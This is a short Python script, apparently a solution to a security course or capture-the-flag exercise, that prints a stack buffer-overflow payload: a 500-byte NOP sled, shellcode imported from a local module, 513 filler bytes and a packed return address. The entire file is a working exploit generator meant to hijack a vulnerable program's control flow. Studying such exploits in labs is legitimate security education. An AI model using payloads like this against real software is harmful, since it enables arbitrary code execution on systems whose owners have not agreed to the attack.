from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write((b'\x90'*500) + shellcode + ('\x12'*513).encode('ASCII') + pack("<I", 0xfffe9411))